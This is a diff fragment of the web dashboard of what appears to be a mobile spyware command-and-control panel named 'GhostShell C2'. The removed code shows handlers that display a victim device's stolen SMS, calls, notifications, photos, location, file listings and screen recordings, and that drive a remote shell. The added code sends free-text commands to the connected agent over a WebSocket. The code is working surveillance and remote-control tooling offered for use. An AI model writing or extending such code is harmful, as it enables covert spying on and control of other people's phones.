-            }
-            
-            totalGalleryPages = totalPages;
-            currentPage = page;
-            document.getElementById('galleryPage').innerText = `Page ${page} of ${totalPages}`;
-            
-            let html = '';
-            files.forEach(file => {
-                html += `
-                    <div class="gallery-item" onclick="openModal('${file.url}')">
-                        <img src="${file.url}" alt="${file.name}" loading="lazy">
-                    </div>
-                `;
-            });
-            
-            grid.innerHTML = html;
-        }
-        
-        // =============== SOCKET.IO HANDLERS ===============
-        
-        socket.on('connect', function() {
-            addConsoleLine('Connected to server', 'success');
-            document.getElementById('statusLed').className = 'status-led online';
-            document.getElementById('statusText').innerHTML = '🟢 SERVER ONLINE';
-            
-            // Get local address
-            fetch('/api/status')
-                .then(r => r.json())
-                .then(data => {
-                    document.getElementById('localAddress').innerText = window.location.host;
-                });
-        });
-        
-        socket.on('disconnect', function() {
-            addConsoleLine('Disconnected from server', 'error');
-            document.getElementById('statusLed').className = 'status-led offline';
-            document.getElementById('statusText').innerHTML = '🔴 SERVER OFFLINE';
-        });
-        
-        socket.on('device_connected', function(data) {
-            addConsoleLine(`Device connected from ${data.ip}:${data.port}`, 'success');
-            deviceConnected = true;
-            document.getElementById('statCommands').innerText = '0';
-        });
-        
-        socket.on('device_disconnected', function() {
-            addConsoleLine('Device disconnected', 'warning');
-            deviceConnected = false;
-            document.getElementById('deviceInfo').innerHTML = '<div class="loading">Waiting for device...</div>';
-        });
-        
-        socket.on('device_info', function(data) {
-            updateDeviceInfo(data);
-            addConsoleLine('Device information received', 'success');
-        });
-        
-        socket.on('sms_received', function(data) {
-            addSMS(data);
-        });
-        
-        socket.on('notification', function(data) {
-            addNotification(data);
-        });
-        
-        socket.on('call_received', function(data) {
-            addCall(data);
-        });
-        
-        socket.on('image_received', function(data) {
-            addConsoleLine(`Image saved: ${data.filename}`, 'success');
-            document.getElementById('statImages').innerText = parseInt(document.getElementById('statImages').innerText) + 1;
-        });
-        
-        socket.on('location', function(data) {
-            if (data.status === 'success') {
-                addConsoleLine(`Location: ${data.url}`, 'success');
-                window.open(data.url, '_blank');
+
+        function sendCommand(command) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                log(`Sending command: ${command}`, 'info');
+                ws.send(command);
             } else {
-                addConsoleLine(`Location failed: ${data.error}`, 'error');
+                log('Cannot send command. WebSocket is not open.', 'error');
+            }
+        }
+
+        function executeTextInput() {
+            const command = textInput.value.trim();
+            if (command) {
+                sendCommand(command);
+                textInput.value = ''; // Clear input after sending
+            }
+        }
+
+        textInput.addEventListener("keyup", function(event) {
+            if (event.key === "Enter") {
+                executeTextInput();
             }
         });
-        
-        socket.on('app_list', function(data) {
-            addConsoleLine(`Found ${data.count} apps`, 'info');
-        });
-        
-        socket.on('file_list', function(data) {
-            addConsoleLine(`File list for ${data.path}`, 'info');
-            data.files.forEach(f => {
-                addConsoleLine(`  ${f.isDirectory ? '[DIR]' : '[FILE]'} ${f.name}`, 'info');
-            });
-        });
-        
-        socket.on('mode_change', function(data) {
-            const indicator = document.getElementById('modeIndicator');
-            const badge = document.getElementById('modeBadge');
-            const dir = document.getElementById('currentDir');
-            
-            if (data.status === 'started') {
-                indicator.style.display = 'flex';
-                badge.className = `mode-badge ${data.mode}`;
-                badge.innerText = `${data.mode.toUpperCase()} MODE`;
-                if (data.dir) dir.innerText = data.dir;
-                
-                if (data.mode === 'shell') {
-                    document.getElementById('promptIndicator').innerHTML = `Shell@${data.dir || '/'}>`;
-                } else {
-                    document.getElementById('promptIndicator').innerHTML = `${data.mode.toUpperCase()} >`;
-                }
-            } else {
-                indicator.style.display = 'none';
-                document.getElementById('promptIndicator').innerHTML = 'C2 >';
-            }
-        });
-        
-        socket.on('shell_ls', function(data) {
-            addConsoleLine(`Listing ${data.dir}:`, 'info');
-            data.files.forEach(f => {
-                addConsoleLine(`  ${f.isDirectory ? '[DIR]' : '[FILE]'} ${f.name}`, 'info');
-            });
-        });
-        
-        socket.on('shell_cd', function(data) {
-            document.getElementById('currentDir').innerText = data.dir;
-            document.getElementById('promptIndicator').innerHTML = `Shell@${data.dir}>`;
-        });
-        
-        socket.on('gallery_page', function(data) {
-            updateGallery(data.files, data.page, data.total_pages);
-            addConsoleLine(`Gallery page ${data.page} loaded`, 'success');
-        });
-        
-        socket.on('command_sent', function(data) {
-            const count = parseInt(document.getElementById('statCommands').innerText) + 1;
-            document.getElementById('statCommands').innerText = count;
-        });
-        
-        socket.on('file_download_complete', function(data) {
-            addConsoleLine(`File downloaded: ${data.filename}`, 'success');
-        });
-        
-        socket.on('gallery_image_complete', function(data) {
-            addConsoleLine(`Gallery image saved: ${data.filename}`, 'success');
-        });
-        
-        socket.on('recording_status', function(data) {
-            if (data.status === 'started') {
-                addConsoleLine('Screen recording started', 'info');
-            } else {
-                addConsoleLine('Screen recording stopped', 'warning');
-            }
-        });
-        
-        // =============== INITIALIZATION ===============
-        
-        updateStats();
-        
-        // Add initial console line
-        addConsoleLine('GhostShell C2 initialized', 'info');
-        
-        // Fetch initial status
-        fetch('/api/status')
-            .then(response => response.json())
-            .then(data => {
-                if (data.device_connected) {
-                    document.getElementById('statusLed').className = 'status-led online';
-                    document.getElementById('statusText').innerHTML = '🟢 DEVICE CONNECTED';
-                }
-                
-                document.getElementById('statCommands').innerText = data.commands || 0;
-                document.getElementById('statNotifications').innerText = data.notifications || 0;
-                document.getElementById('statSMS').innerText = data.sms || 0;
-                document.getElementById('statCalls').innerText = data.calls || 0;
-                document.getElementById('statImages').innerText = data.images || 0;
-                
-                if (data.device_info) {
-                    updateDeviceInfo(data.device_info);
-                }
-            });
+
+        window.onload = () => {
+            setAgentStatus(false); // Initially disconnected
+            connect();
+        };
     </script>
 </body>
 </html>
